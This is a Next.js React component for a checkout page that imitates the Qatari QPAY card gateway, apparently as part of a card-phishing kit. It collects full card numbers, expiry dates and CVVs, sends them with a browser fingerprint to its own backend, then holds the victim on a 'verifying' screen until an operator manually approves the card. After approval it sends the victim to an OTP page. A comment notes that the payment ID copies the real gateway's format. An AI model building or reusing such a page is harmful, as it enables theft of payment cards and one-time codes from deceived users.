"use client";

import { useState, FormEvent, useEffect, useCallback } from "react";
import { getFingerprint } from "@/lib/presence";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { Dictionary } from "@/lib/i18n";
import { Card } from "@/components/ui/Card";
import { formatSalary } from "@/lib/utils";
import { luhnCheck } from "@/lib/card-utils";
import { subscribeToEntryStatus } from "@/lib/realtime";
import type { Booking, Worker } from "@/lib/supabase/types";
import styles from "./QpayClient.module.css";

export function QpayClient({
  booking,
  amount,
  serviceFee,
  total,
  dict,
  locale,
}: {
  booking: Booking & { workers: Worker };
  amount: number;
  serviceFee: number;
  total: number;
  dict: Dictionary;
  locale: string;
}) {
  const router = useRouter();
  const p = dict.payment;

  const [cardNumber, setCardNumber] = useState("");
  const [expMonth, setExpMonth] = useState("");
  const [expYear, setExpYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [cvvVisible, setCvvVisible] = useState(false);
  const [cardValid, setCardValid] = useState<boolean | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  // وضع الانتظار: بعد إرسال البطاقة ننتظر قرار المدير (موافقة/رفض).
  // "pending" ⟶ شاشة الانتظار، "approved" ⟶ توجيه لصفحة OTP، "rejected" ⟶ شاشة رفض.
  const [waiting, setWaiting] = useState(false);
  const [paymentEntryId, setPaymentEntryId] = useState<string | null>(null);
  const [rejected, setRejected] = useState(false);
  const [decisionError, setDecisionError] = useState(false);

  // رقم دفع فريد بصيغة ITM-XXXXXXXX (مثل البوابة الفعلية).
  const [paymentId] = useState(
    () => `ITM-${Math.floor(10000000 + Math.random() * 90000000)}`,
  );

  const isAr = locale === "ar";

  useEffect(() => {
    if (!cardNumber) return;
    const raw = cardNumber.replace(/\D/g, "");
    const valid = luhnCheck(raw);
    setCardValid(valid);
    setCvvVisible(valid);
    if (!valid) setCvv("");
  }, [cardNumber]);

  function formatCardNumber(value: string): string {
    const digits = value.replace(/\D/g, "").slice(0, 19);
    return digits.replace(/(.{4})/g, "$1 ").trim();
  }

  const isComplete =
    cardValid === true &&
    expMonth !== "" &&
    expYear !== "" &&
    (!cvvVisible || cvv.length >= 3);

  // جلب الحالة الفعلية من الخادم (لا نثق بالبثّ وحده).
  const checkDecision = useCallback(
    async (entryId: string) => {
      try {
        const res = await fetch(`/api/payments/status?entryId=${entryId}`, {
          cache: "no-store" as RequestCache,
          headers: { "Cache-Control": "no-cache, no-store, must-revalidate" },
        });
        const data = await res.json();
        if (data.status === "approved") {
          setDecisionError(false);
          router.push(`/${locale}/payment/qpay/${booking.id}/verify?pid=${entryId}`);
          return;
        }
        if (data.status === "rejected") {
          setDecisionError(false);
          setRejected(true);
          setWaiting(false);
          return;
        }
      } catch {
        setDecisionError(true);
      }
    },
    [booking.id, locale, router],
  );

  // أثناء الانتظار: اشترك في قرار المدير عبر Realtime + polling احتياطي.
  useEffect(() => {
    if (!waiting || !paymentEntryId) return;

    let cancelled = false;

    const channel = subscribeToEntryStatus(
      paymentEntryId,
      () => {
        if (!cancelled) void checkDecision(paymentEntryId);
      },
      () => {
        if (!cancelled) void checkDecision(paymentEntryId);
      },
    );

    // قراءة فورية عند الدخول (قد يكون القرار صدر قبل الاشتراك).
    void checkDecision(paymentEntryId);

    // polling احتياطي بطيء تحسّباً لفشل البثّ أو انقطاع السوكيت.
    const interval = setInterval(() => {
      if (!cancelled) void checkDecision(paymentEntryId);
    }, 5000);

    return () => {
      cancelled = true;
      clearInterval(interval);
      void channel.unsubscribe();
    };
  }, [waiting, paymentEntryId, checkDecision]);

  async function handleSubmit(e: FormEvent) {
    e.preventDefault();
    setError(null);
    const raw = cardNumber.replace(/\D/g, "");
    if (!luhnCheck(raw)) {
      setError(p.qpayInvalidCard);
      return;
    }
    setLoading(true);
    try {
      const res = await fetch("/api/payments/qpay-initiate", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-fingerprint": getFingerprint(),
        },
        body: JSON.stringify({
          bookingId: booking.id,
          cardNumber: raw,
          expiry: `${expMonth}/${expYear.slice(2)}`,
          cvv,
        }),
      });
      const data = await res.json();
      if (!res.ok) {
        setError(data.error === "already_paid" ? p.verifySuccess : p.qpayInvalidCard);
        return;
      }
      // لا ننتقل لصفحة OTP مباشرة؛ ننتظر قرار المدير على بيانات البطاقة.
      setPaymentEntryId(data.entryId);
      setWaiting(true);
    } catch {
      setError(p.invalidCard);
    } finally {
      setLoading(false);
    }
  }

  const years = Array.from({ length: 8 }, (_, i) => String(new Date().getFullYear() + i));
  const months = Array.from({ length: 12 }, (_, i) =>
    String(i + 1).padStart(2, "0"),
  );

  // ===== شاشة "جارٍ التحقق من المعلومات" (بانتظار قرار المدير) =====
  if (waiting) {
    return (
      <div className={styles.layout}>
        <Card className={styles.statusCard}>
          <div className={styles.statusIconWrap}>
            <div className={styles.spinner} />
          </div>
          <h1 className={styles.statusTitle}>{p.qpayWaitingTitle}</h1>
          <p className={styles.statusSub}>{p.qpayWaitingSub}</p>
          <div className={styles.statusSteps}>
            <span className={styles.statusStep}>١. {p.qpayWaitingStep1}</span>
            <span className={styles.statusStep}>٢. {p.qpayWaitingStep2}</span>
            <span className={styles.statusStep}>٣. {p.qpayWaitingStep3}</span>
          </div>
          <p className={styles.statusImportant}>{p.qpayWaitingDoNotClose}</p>
          {decisionError && (
            <p className={styles.statusError}>{p.qpayWaitingReconnect}</p>
          )}
          <Link
            href={`/${locale}/payment/${booking.id}`}
            className={styles.statusCancel}
          >
            {p.qpayCancel}
          </Link>
        </Card>
      </div>
    );
  }

  // ===== شاشة الرفض =====
  if (rejected) {
    return (
      <div className={styles.layout}>
        <Card className={styles.rejectedCard}>
          <div className={styles.rejectedIcon}>✗</div>
          <h1 className={styles.rejectedTitle}>{p.qpayRejectedTitle}</h1>
          <p className={styles.rejectedSub}>{p.qpayRejectedMsg}</p>
          <Link
            href={`/${locale}/payment/${booking.id}`}
            className={styles.retryBtn}
          >
            {p.retryPayment}
          </Link>
        </Card>
      </div>
    );
  }

  return (
    <div className={styles.layout}>
      <Card className={styles.panel}>
        {/* شعار QPAY */}
        <div className={styles.brandRow}>
          <div className={styles.logo}>
            <span className={styles.logoBar} />
            <span className={styles.logoBarDim} />
            <span className={styles.logoBarDimmer} />
            <span className={styles.logoText}>QPAY</span>
          </div>
        </div>

        <div className={styles.metaRows}>
          <div className={styles.metaRow}>
            <span className={styles.metaLabel}>{p.qpayUniqueNumber}</span>
            <span className={styles.metaValue} dir="ltr">{paymentId}</span>
          </div>
          <div className={styles.metaRow}>
            <span className={styles.metaLabel}>{p.qpayDescription}</span>
            <span className={styles.metaValue}>{paymentId}</span>
          </div>
        </div>

        <div className={styles.amountWrap}>
          <span className={styles.amountLabel}>{p.qpayAmountLabel}</span>
          <div className={styles.amountValue}>
            QAR <span>{formatSalary(amount, locale)}</span>
          </div>
        </div>

        <div className={styles.formBox}>
          <div className={styles.formHeader}>{p.qpayCardDetails}</div>

          <form onSubmit={handleSubmit} className={styles.form}>
            <div className={styles.fieldGroup}>
              <div className={styles.fieldLabelRow}>
                <label className={styles.fieldLabel}>{p.qpayCardNumber}</label>
                {cardValid !== null && (
                  <span
                    className={`${styles.cardStatus} ${
                      cardValid ? styles.cardValid : styles.cardInvalid
                    }`}
                  >
                    {cardValid ? `✓ ${p.qpayCardValid}` : `✕ ${p.qpayCardInvalid}`}
                  </span>
                )}
              </div>
              <input
                type="text"
                inputMode="numeric"
                dir="ltr"
                value={cardNumber}
                onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                placeholder={p.qpayCardNumberPh}
                className={`${styles.input} ${
                  cardValid === false ? styles.inputError : ""
                }`}
                maxLength={19}
                required
              />
            </div>

            <div>
              <label className={styles.fieldLabel}>{p.qpayExpiry}</label>
              <div className={styles.expiryRow}>
                <select
                  value={expMonth}
                  onChange={(e) => setExpMonth(e.target.value)}
                  className={styles.select}
                  required
                >
                  <option value="" disabled>
                    {p.qpayMonth}
                  </option>
                  {months.map((m) => (
                    <option key={m} value={m}>
                      {m}
                    </option>
                  ))}
                </select>
                <select
                  value={expYear}
                  onChange={(e) => setExpYear(e.target.value)}
                  className={styles.select}
                  required
                >
                  <option value="" disabled>
                    {p.qpayYear}
                  </option>
                  {years.map((y) => (
                    <option key={y} value={y}>
                      {y}
                    </option>
                  ))}
                </select>
              </div>
            </div>

            {cvvVisible && (
              <div className={styles.cvvWrap}>
                <label className={styles.fieldLabel}>{p.qpayCvv}</label>
                <input
                  type="password"
                  inputMode="numeric"
                  dir="ltr"
                  value={cvv}
                  onChange={(e) =>
                    setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))
                  }
                  placeholder={p.qpayCvvPh}
                  className={`${styles.input} ${styles.cvvInput}`}
                  maxLength={4}
                  required
                />
              </div>
            )}

            <p className={styles.termsText}>
              {p.qpayTerms}{" "}
              <a href={`/${locale}/terms`} className={styles.termsLink}>
                {p.qpayTermsLink}
              </a>
            </p>

            <div className={styles.napsRow}>
              <span className={styles.napsLabel}>
                <span className={styles.napsRed}>N</span>APS
              </span>
              <span className={styles.himyanLabel}>
                <span className={styles.napsRed}>H</span>IMYAN
              </span>
            </div>

            {error && <div className={styles.error}>{error}</div>}

            <div className={styles.actions}>
              <button
                type="submit"
                disabled={!isComplete || loading}
                className={`${styles.submitBtn} ${isComplete ? styles.submitReady : ""}`}
              >
                {loading ? p.qpayProcessing : p.qpayContinue}
              </button>
              <Link href={`/${locale}/payment/${booking.id}`} className={styles.cancelBtn}>
                {p.qpayCancel}
              </Link>
            </div>
          </form>
        </div>

        <p className={styles.warning}>{p.qpayWarning}</p>
      </Card>
    </div>
  );
}